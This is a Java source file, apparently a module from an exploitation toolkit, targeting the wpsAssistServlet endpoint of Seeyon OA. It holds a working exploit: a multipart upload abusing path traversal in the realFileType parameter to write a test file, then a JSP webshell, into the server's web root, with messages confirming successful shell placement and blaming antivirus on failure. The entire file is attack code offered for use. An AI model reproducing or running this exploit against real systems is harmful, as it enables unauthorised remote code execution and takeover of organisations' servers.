package Exp.OA.seeyonoa;

import Utilss.HttpTools;
import Utilss.Response;
import Utilss.shell;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.util.HashMap;

public class seeyonoa_wpsAssistServlet implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Boolean shell = shell(url, textArea);
        return shell;
    }

    private Boolean att(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");
        String payload = "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"upload\"; filename=\"123.xls\"\r\n" +
                "Content-Type: application/vnd.ms-excel\r\n" +
                "\r\n" +
                shell.readFile(shell.Testpath) + "\r\n" +
                "--59229605f98b8cf290a7b8908b34616b--\n";

        Response post = HttpTools.post(url + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/nishizhu.txt&fileId=2", payload, head, "utf-8");
        Response response = HttpTools.get(url + "/nishizhu.txt", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            textArea.appendText("\n 漏洞存在 测试文件写入成功\n " + url + "/nishizhu.txt");
            return true;
        }else {
            textArea.appendText("\n seeyonoa_wpsAssisServlet-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }

    private Boolean shell(String url,TextArea textArea){HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");
        String payload = "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"upload\"; filename=\"123.xls\"\r\n" +
                "Content-Type: application/vnd.ms-excel\r\n" +
                "\r\n" +
                shell.readFile(shell.Jsppath) + "\r\n" +
                "--59229605f98b8cf290a7b8908b34616b--\n";

        Response post = HttpTools.post(url + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/nishizhu.jsp&fileId=2", payload, head, "utf-8");
        Response response = HttpTools.get(url + "/nishizhu.jsp", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            textArea.appendText("\n 漏洞存在 webshell写入成功\n " + url + "/nishizhu.jsp");
            return true;
        }else {
            textArea.appendText("\n 疑似杀软查杀 请手动复现");
            return false;
        }
    }
}
